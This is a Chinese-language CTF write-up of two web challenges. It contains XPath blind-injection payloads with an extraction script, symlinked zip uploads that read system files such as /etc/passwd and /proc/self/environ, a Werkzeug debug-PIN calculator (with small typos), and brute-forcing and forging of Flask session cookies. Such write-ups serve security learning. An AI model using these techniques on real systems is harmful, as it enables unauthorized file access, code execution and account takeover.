**ll战队，第49名，做出来了web的babyjava和OnlineUnzip**

![image-20220917210731047](D:\Typora\note\CTF\web\比赛wp\mtctf.assets\image-20220917210731047.png)

# web

## babyjava|done by xlccccc

题目说的很清楚了**XPath注入**

相应的payload

```ABAP
'or substring(name(parent::*[position()=1]),1,1)='u   盲注父节点
'or substring(//user[1]/*[1],1,1)='p' or 'a'='a   盲注第一个子节点名字
'or substring(//user[1]/*[1]/text(),1,1)='p' or 'a'='a   盲注该子节点内容
```

有了payload，盲注就很简单了

exp

```py
import requests

url='http://eci-2ze5la2t5773je0017ln.cloudeci1.ichunqiu.com:8888/hello'
str='abcdefghijklmnopqrstuvwxyz0123456789{}_=+*-.@<>?/!@#$%^&*()_+|'
flag=''
for i in range(1,666):
    for j in str:
        #data={'xpath':f"'or substring(name(parent::*[position()=1]),{i},1)='{j}"}	user
        #data={'xpath':f"'or substring(//user[1]/*[1]/,{i},1)='{j}"}				user1
        #data={'xpath':f"'or substring(//user[1]/*[2]/,{i},1)='{j}"}				flag
        data={'xpath':f"'or substring(//user[1]/*[2]/text(),{i},1)='{j}"}
        #print(data)
        r=requests.post(url,data=data)
        if 'This information is not available' not in r.text:
            flag+=j
            print(flag)
            break
```

运行得到flag

![image-20220917210011442](D:\Typora\note\CTF\web\比赛wp\mtctf.assets\image-20220917210011442.png)

## OnlineUnzip|done by xlccccc

题目给出了源码

可以看到debug模式是开的，很可能这题就是**flask算pin**

目录穿越被`..`的正则过滤了，所有目录穿越不可能

这里可以用到**linux**的超链接

构建一个超链接压缩后上传，在远程环境下就是远程执行超链接就可以看到任意文件

例如

```sh
ln -s /etc/passwd 1
zip --symlinks 1.zip 1
```

一定要是**symlinks**模式，否则压缩的就是自己本地的内容

所有我们目前需要的就是

**当前用户**

**flask中app.py的路径**

**uuid**

**machine_id**

```sh
ln -s /proc/self/environ 1
zip --symlinks 1.zip 1
上传后下载看到当前用户是 ctf
ln -s /sys/class/net/eth0/address 2
zip --symlinks 2.zip 2
上传后下载十六进制转十进制拿到uuid
不知道py版本，测试一下发现是3.8
ln -s /usr/local/lib/python3.8/site-packages/flask/app.py 3
zip --symlinks 3.zip 3
```

3.8的版本是和这三个文件有关

```
/etc/machine-id
/proc/sys/kernel/random/boot_id
/proc/self/cgroup
```

如果第一个文件存在，则第二个文件不需要，在看第三个文件中的内容

![image-20220917205816984](D:\Typora\note\CTF\web\比赛wp\mtctf.assets\image-20220917205816984.png)

最后那段`c0239a`....

得到所有数据后，用**py3.8**的版本算出pin(sha1加密不是md5)

```py
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '95533043256',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '96cec10d3d9307792745ec3b85c89620567bdd6dd7eb762b937eccd1f8e6a61036dd86ddad5c1669887bbd197d5e1852'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
            ontinue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

算出pin登陆后拿到flag

![image-20220917210425106](D:\Typora\note\CTF\web\比赛wp\mtctf.assets\image-20220917210425106.png)

![image-20220917210357541](D:\Typora\note\CTF\web\比赛wp\mtctf.assets\image-20220917210357541.png)









```php
xlccccc@xl-pc:/ctf/web$ flask-unsign --unsign --cookie 'eyJ1c2VyIjoibm5tYW4ifQ.YyXZyA.CeMFCofLxclnNvY5iP54MvWeGWY' --wordlist 123.txt --no-literal-eval
[*] Session decodes to: {'user': 'nnman'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 38912 attempts
b'97f7'

python3 flask_session_cookie_manager3.py decode -s '97f7' -c 'eyJ1c2VyIjoibm5tYW4ifQ.YyXZyA.CeMFCofLxclnNvY5iP54MvWeGWY'

python3 flask_session_cookie_manager3.py encode -t "{'user': 'admin'}" -s '97f7'
eyJ1c2VyIjoiYWRtaW4ifQ.YyXbLg.XDHD_2KUNiPCQ-SJkrQq33XNDV0
or
xlccccc@xl-pc:/ctf/web$ flask-unsign --sign --cookie "{'user': 'nnman'}" --secret '97f7'
eyJ1c2VyIjoibm5tYW4ifQ.YyXbtg.-JxWBlCzfhDOKp6gw1uNFw3IKRE
    
flask-unsign 可暴力破解 可签名 要flask_session_cookie_manager3有何用？
```

